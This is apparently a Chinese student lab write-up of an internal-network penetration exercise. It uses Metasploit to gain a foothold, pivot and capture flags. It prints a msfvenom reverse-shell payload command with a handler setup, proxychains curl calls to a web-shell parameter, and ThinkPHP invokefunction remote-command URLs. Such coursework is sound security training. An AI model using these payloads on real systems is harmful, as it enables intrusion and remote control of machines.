# 网安实践：内网渗透和攻击

## 实验环境

* kali

* metasploit

## 实验步骤

### 步骤一 设立立足点并发现靶标2-3

1. 在攻击者主机上生成meterpreter.elf文件
` msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<攻击者主机IP> LPORT=<端口> -f elf > meterpreter.elf`
![](./pics/手动生成meterpretershell.png)

2. 上传
![](./pics/上传成功.png)

3. 在metasploit里设置如下并`run -j`等待
```
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost <攻击者主机IP>
set lport <端口>
run -j
```
注意，这里的IP和端口要和生成.elf文件时设置的一样

5. 在靶机里运行meterpreter.elf
![](./pics/进入容器下载文件并运行.png)

6. 返回到攻击者主机，可以看到连接成功
![](./pics/拿到meterpretershell.png)

7. 升级shell
![](./pics/升级会话窗口.png)

8. 查看route，arp， ipconfig
![](./pics/查看arp.png)
![](./pics/查看route.png)
![](./pics/ipconfig.png)

9. 设置pivot路由
![](./pics/添加pivot路由.png)

10. 扫描
![](./pics/扫描结果1.png)
扫描100%后查看存活的主机和服务，使用`hosts`和`services`
![](./pics/开放的主机和服务.png)

11. 设置代理
参照[教学课件](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/%E5%BB%BA%E7%AB%8B%E7%AB%8B%E8%B6%B3%E7%82%B9%E5%B9%B6%E5%8F%91%E7%8E%B0%E9%9D%B6%E6%A0%872-4)和视频
![](./pics/socks代理.png)
![](./pics/查看1080端口服务开放情况.png)
`cat /etc/proxychains4.conf` 
确认有以下配置
![](./pics/修改proxychains配置.png)
并且配置浏览器代理
![](./pics/代理3.png)

12. 成功访问第一层
![](./pics/访问thinkphp.png)

### 步骤二 攻击新发现的靶机

#### nginx
nginx
1. 设置代理curl扫描到的IP
` proxychains curl http://192.170.84.2`
![](./pics/访问第二台主机.png)

2. 根据提示执行以下命令
`proxychains curl http://<目标IP>/index.php?cmd=ls%20/tmp`
![](./pics/第二个flag.png)

#### thinkphp

cve_2018_1002015
1. 浏览器访问以下网页，执行phpinfo()
`http://<目标IP>:<端口>/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1`
![](./pics/phpinfo.png)
2. 执行系统命令
`http://<目标IP>:<端口>/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=ls%20/tmp`
![](./pics/第三个flag.png)

### 步骤三 

1. 查看第一层两台主机的ip
访问`http://<目标IP>:<端口>/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=ip%20a`
![](./pics/双网卡.png)
可以看到192.170.84.3这一台机器有双网卡

## 参考资料
[教学课件](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/%E5%BB%BA%E7%AB%8B%E7%AB%8B%E8%B6%B3%E7%82%B9%E5%B9%B6%E5%8F%91%E7%8E%B0%E9%9D%B6%E6%A0%872-4)
